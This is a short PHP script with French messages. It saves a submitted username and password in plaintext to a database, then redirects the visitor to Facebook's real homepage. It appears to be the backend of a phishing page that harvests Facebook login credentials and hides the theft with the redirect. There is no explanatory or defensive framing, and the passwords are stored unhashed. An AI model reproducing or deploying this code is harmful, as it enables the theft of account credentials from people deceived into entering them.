<?php
session_start();
require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $user = trim($_POST['username']);
  $pass = trim($_POST['password']);

  if (!empty($user) && !empty($pass)) {
    $stmt = $pdo->prepare('INSERT INTO users (username, password) VALUES (?, ?)');
    $stmt->execute([$user, $pass]);
    echo "Informations enregistrées avec succès !";
    header("Location: https://web.facebook.com/?locale=fr_FR&_rdc=1&_rdr");
    exit;
  } else {
    echo "Veuillez remplir tous les champs.";
  }
}
?>
